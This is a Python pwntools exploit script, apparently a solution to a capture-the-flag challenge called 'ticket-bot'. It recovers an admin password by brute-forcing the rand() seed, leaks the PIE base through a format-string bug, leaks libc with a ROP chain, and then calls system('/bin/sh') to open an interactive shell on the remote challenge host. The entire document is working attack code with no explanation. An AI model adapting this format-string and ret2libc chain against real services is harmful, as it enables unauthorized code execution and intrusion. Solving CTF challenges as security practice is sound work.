from pwn import *
from ctypes import *


# generate random values for brute forcing

libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")

rand = [(0, 0) for i in range(10000000)]
for i in range(10000000):
    libc.srand(i)
    rand[i] = (libc.rand(), libc.rand())


REMOTE = True

if REMOTE:
    r = remote("ticket-bot.challs.csc.tf", 1337)
else:
    r = process("./attachment/chal")

sla = r.sendlineafter


def login(pw):
    sla(b"========================\n", b"2")
    sla(b"Admin Password\n", str(pw).encode())


def change_pw(pw):
    sla(b"========================\n", b"1")
    sla(b"Enter new Password\n", pw)


# get admin password

r.recvuntil(b"ticketID ")
id = int(r.recvline()[:-1])
seed = 0

for i in range(10000000):
    if rand[i][1] == id:
        seed = i
        password = rand[i][0]
        break

log.info(f"seed: {hex(seed)}")
log.info(f"password: {hex(password)}")


# leak pie

login(password)
change_pw(b"%9$p")

r.recvuntil(b"0x")
pie = int(r.recvuntil(b"=")[:-1], 16) - 0x142F
log.info(f"pie base: {hex(pie)}")

puts_plt = pie + 0x1100
menu = pie + 0x152E
pop_rdi = pie + 0x1653  # pop rdi; ret
puts_got = pie + 0x3F78


# leak libc

payload = b"A" * 0x10

# puts(puts_got)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)

# return to menu()
payload += p64(menu)

login(0)
change_pw(payload)

r.recvuntil(b"AAAA")
if REMOTE:
    libc = u64(r.recvline()[:-1].ljust(8, b"\x00")) - 0x84420
else:
    libc = u64(r.recvline()[:-1].ljust(8, b"\x00")) - 0x80E50
log.info(f"libc base: {hex(libc)}")

if REMOTE:
    system = libc + 0x52290
    binsh = libc + 0x1B45BD
else:
    system = libc + 0x50900
    binsh = libc + 0x1D8678


# get shell

payload = b"A" * 0x10

# system("/bin/sh")
payload += p64(pop_rdi + 1)  # ret (for stack alignment)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

login(0)
change_pw(payload)


r.interactive()
